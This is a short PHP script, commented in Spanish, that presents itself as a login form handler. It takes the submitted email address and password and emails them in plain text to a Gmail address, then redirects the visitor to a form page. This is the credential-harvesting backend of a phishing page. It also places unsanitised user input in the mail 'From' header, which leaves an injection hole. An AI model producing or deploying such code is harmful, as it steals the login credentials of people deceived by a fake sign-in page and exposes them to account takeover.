<?php

// Correo electrónico de destino
$destinatario = "zukoweb.3a@gmail.com";

// Asunto del correo
$asunto = "Formulario de inicio de sesión";

// Datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];
$respuesta = $_POST['aiHelp'];

// Construir el mensaje del correo
$mensaje = "Correo electrónico: $email\n";
$mensaje .= "Contraseña: $password\n";
$mensaje .= "Respuesta: $respuesta\n";

// Cabeceras del correo
$headers = "From: $email";

// Enviar el correo
mail($destinatario, $asunto, $mensaje, $headers);

// Redireccionar a una página de confirmación o a donde desees
header("Location: formulario.html");

?>
